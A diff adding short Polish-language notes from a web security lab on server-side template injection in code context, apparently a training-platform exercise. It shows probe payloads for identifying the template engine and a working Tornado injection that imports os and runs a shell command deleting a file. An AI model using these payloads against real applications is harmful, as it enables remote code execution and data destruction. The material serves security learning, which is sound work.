@@ -1,0 +1,23 @@
+Lab: Basic server-side template injection (code context)
+
+Co to code context
+Twoje dane są wstrzykiwane bezpośrednio w kod szablonu a nie w treść HTML:
+python# Normalny context:
+render("Witaj, " + username)
+
+# Code context – zmienna w kodzie szablonu:
+render("Witaj, {{username}}")
+
+
+atakujemy miejsce z ustawieniem preferred dispaly
+
+dodaje post na blogu
+original:blog-post-author-display=user.name}}{{7*7}}&csrf=fsSfeYGDVoowYdtfe2gH3tcKyofCQkXC
+payload:blog-post-author-display=user.name}}{{7*7}}&csrf=fsSfeYGDVoowYdtfe2gH3tcKyofCQkXC
+weryfikacja podatności: sprawdzam post na blogu jak się wyświetla moje imie np. wiener49
+weryfikacja silnika: blog-post-author-display=user.first_name}}{{7*'7'}}&csrf=fsSfeYGDVoowYdtfe2gH3tcKyofCQkXC   >>>>>  Peter7777777}} 
+  Widzisz 7777777 → Jinja2 ;lub Tornado. najpeije wywlac blad w payloadzie
+  Widzisz 49 → Twig
+
+exploit Tornado:
+blog-post-author-display=user.first_name}}{%import os%}{{os.popen('rm /home/carlos/morale.txt').read()}}&csrf=fsSfeYGDVoowYdtfe2gH3tcKyofCQkXC
